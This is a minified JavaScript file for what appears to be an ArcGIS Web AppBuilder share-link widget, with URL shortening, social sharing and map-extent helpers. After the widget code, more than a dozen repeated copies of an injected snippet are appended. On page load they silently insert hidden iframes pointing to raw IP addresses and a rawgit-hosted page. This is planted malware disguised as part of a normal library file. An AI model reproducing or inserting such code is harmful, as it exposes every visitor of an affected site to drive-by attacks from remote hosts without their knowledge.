b.layerInfo.layerObject.fields&&(a=b.layerInfo.layerObject.fields);return a},_getUrlFromLayerChoose:function(){var a="",b=this.layerChooserFromMapWithDropbox.getSelectedItem();b&&b.url&&(a=b.url);return a},_updateLinkOptionsUI:function(){g(".optionsMore",this.domNode).style("display","none");g("."+this.optionSrc+"_optionsMore",this.domNode).style("display","block");this.overwirteMobileLayout.checked&&g(".share-options-overwirteMobileLayout_optionsMore",this.domNode).style("display","block");this.setlanguage.checked&&
g(".share-options-language_optionsMore",this.domNode).style("display","block");this.auth.checked&&g(".share-options-auth_optionsMore",this.domNode).style("display","block")},_fixUrlIfIsOnline:function(a){if(this._isOnline&&this._isSharedToPublic){var b="",b=window.isBuilder?window.top.location.protocol:window.location.protocol,c=this._getUrlQueryString(a);a=this._getOnlinePublicUrl(a);a=b+"//"+a+"/apps/webappviewer/index.html"+c}return a},updateUrl:function(a){this._updateResUrls(a);this._updateLinkOptionsUI();
this.preview.set("value",this._fixUrlIfIsOnline(this.resultUrl));null===a&&this._generateShortenUrl()},_generateShortenUrl:function(){var a=this.preview.get("value");try{this.isUseShortenUrl()?this.shortenUrl(a,this.bitlyUrl).then(c.hitch(this,function(a){this._useShortenUrl(a);this.HAS_INIT_URL=!0}),c.hitch(this,function(b){this._useLengthenUrl(a,b);this.HAS_INIT_URL=!0})):(this._useLengthenUrl(a),this.HAS_INIT_URL=!0)}catch(b){console.error(b),this.HAS_INIT_URL=!0}},_useShortenUrl:function(a){this.shortenedUrl=
a;this._setLinkUrl(a);this._setEmbedCode(a)},_useLengthenUrl:function(a){a=a||"";this._setLinkUrl(a);this._setEmbedCode(a)},_toFacebook:function(){var a="http://www.facebook.com/sharer/sharer.php?s\x3d100\x26u\x3d"+encodeURIComponent(this._linkUrlTextBox.get("value"))+"\x26t\x3d"+encodeURIComponent(k.stripHTML(this.socialNetworkTitle(this._appTitle)));window.open(a,"_blank")},_toTwitter:function(){var a=p.substitute(this.share.shareTwitterTxt,{appTitle:k.stripHTML(this._appTitle)}),b=this._linkUrlTextBox.get("value");
window.open("http://twitter.com/home?status\x3d"+encodeURIComponent(a+b+"\n@ArcGISOnline"),"_blank")},_toEmail:function(){var a="mailto:?subject\x3d"+p.substitute(this.share.shareEmailSubject,{appTitle:k.stripHTML(this._appTitle)}),b=this.preview.get("value"),a=a+("\x26body\x3d"+encodeURIComponent(this.nls.shareEmailTxt1)+"%0D%0A%0D%0A"+k.stripHTML(this._appTitle)),a=a+("%0D%0A"+encodeURIComponent(b)),a=a+("%0D%0A%0D%0A"+encodeURIComponent(this.nls.shareEmailTxt2)),a=a+("%0D%0A%0D%0A"+encodeURIComponent(this.nls.shareEmailTxt3));
window.top.location.href=a},_toGooglePlus:function(){var a=this._linkUrlTextBox.get("value"),a="http://plus.google.com/share?url\x3d"+encodeURIComponent(a);window.open(a,"_blank")},_toggleLinkOptions:function(){var a=g(".shareOptionsWrapper",this.domNode.parentNode||this.domNode.parentElement),b=g(".shareUrlsWrapper",this.domNode),c=g(".shareLinkOptionsWrapper",this.domNode);this._isShareLinkOptionsShow()?(h.publish("ShareLink/onHideLinkOptions"),this._cleanMarkerStatus(),this._generateShortenUrl()):
h.publish("ShareLink/onShowLinkOptions");a&&a[0]&&e.toggle(a[0],"displaynone");e.toggle(b[0],"displaynone");e.toggle(c[0],"displaynone")},_moreOptionsExpandCollapse:function(){e.toggle(this.MoreOptionsContainer,"displaynone");e.toggle(this.MoreOptionsIcon,"rotate")},_setInputsClicktoSelect:function(a){l.set(a,"onclick","this.select()");l.set(a,"onmouseup","return false;")},isUseShortenUrl:function(){return location.hostname.endWith("esri.com")||location.hostname.endWith("arcgis.com")?!0:!1},shortenUrl:function(a,
b){var d=new A;a=f.addQueryParamToUrl(b,"longUrl",a,!0);a=f.addQueryParamToUrl(a,"format","json",!0);B({url:a,handleAs:"json",callbackParamName:"callback"}).then(c.hitch(this,function(a){a&&200===a.status_code&&a.data&&a.data.url&&0<a.data.url.length?d.resolve(a.data.url):d.reject(a)}),c.hitch(this,function(a){console.log("can't fetch shortenUrl "+a);d.reject(a)}));return d},socialNetworkTitle:function(a){100<a.length&&(a=a.substring(0,97)+"...");return a},getMapExtent:function(a){a=a.extent;var b=
"";a.spatialReference.wkid?b=a.spatialReference.wkid:!a.spatialReference.wkid&&a.spatialReference.wkt&&(b="wkt\x3d"+a.spatialReference.wkt);return null!==a?this._roundValue(a.xmin,1E4)+","+this._roundValue(a.ymin,1E4)+","+this._roundValue(a.xmax,1E4)+","+this._roundValue(a.ymax,1E4)+","+b:""},_roundValue:function(a,b){return Math.round(a*b)/b},getMapCenter:function(a,b,c,d){c=c?c:",";var e=null;b&&b.x&&b.y?e=b:a.extent.getCenter()&&(e=a.extent.getCenter());a=d||e.spatialReference.wkid;return null!==
e?this._roundValue(e.x,1E4)+c+this._roundValue(e.y,1E4)+c+a:""},_getMapLevel:function(){return this.map.getLevel()},_getMapScale:function(){return this.map.getScale()},_getWkid:function(){return this.addMarker_spatialReference.get("value")||""},_query:function(a,b,c){var d=new C;d.where="1\x3d1";d.outSpatialReference=c.spatialReference;d.outFields=a;return(new D(b)).execute(d)},_getQueryedValues:function(a,b){var d=[];n.forEach(b.features,c.hitch(this,function(b){b=b.attributes[a]+"";d.push({label:b,
value:b})}));return d},_addGraphicsLayer:function(){window.isBuilder||"undefined"!==typeof this._graphicsLayer||(this._graphicsLayer=new G,this.map.addLayer(this._graphicsLayer))},_removeGraphicsLayer:function(){window.isBuilder||"undefined"===typeof this._graphicsLayer||(this._graphicsLayer.remove(this._markerGraphic),this._markerGraphic=null)},_addGraphicsLayerMarker:function(a){window.isBuilder||"undefined"===typeof this._graphicsLayer||(this._markerGraphic=this._getMarkerGraphic(a.mapPoint),this._graphicsLayer.add(this._markerGraphic))},
_getMarkerGraphic:function(a){var b=new E(require.toUrl("jimu")+"/images/EsriBluePinCircle26.png",26,26);b.setOffset(0,12);return new F(a,b)},_unselectMarkerBtn:function(){for(var a=g(".markers",this.domNode),b=0,c=a.length;b<c;b++)e.remove(a[b],"selected")},_selectMarkerBtn:function(a){e.add(a.srcElement||a.target,"selected")},_cleanMarkerStatus:function(){this._mapClickHandler&&this._mapClickHandler.remove&&this._mapClickHandler.remove();this._unselectMarkerBtn();this._removeGraphicsLayer()},_isShareLinkOptionsShow:function(){var a=
g(".shareLinkOptionsWrapper",this.domNode);return!e.contains(a[0],"displaynone")},_getUrlQueryString:function(a){var b="";-1!==a.indexOf("?")&&(b=a.substring(a.indexOf("?")));return b},_getOnlinePublicUrl:function(){var a="www.arcgis.com",b=this._portalUrl;b&&"string"===typeof b&&(-1<b.indexOf("devext.arcgis.com")?a="devext.arcgis.com":-1<b.indexOf("qaext.arcgis.com")&&(a="qaext.arcgis.com"));return a}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});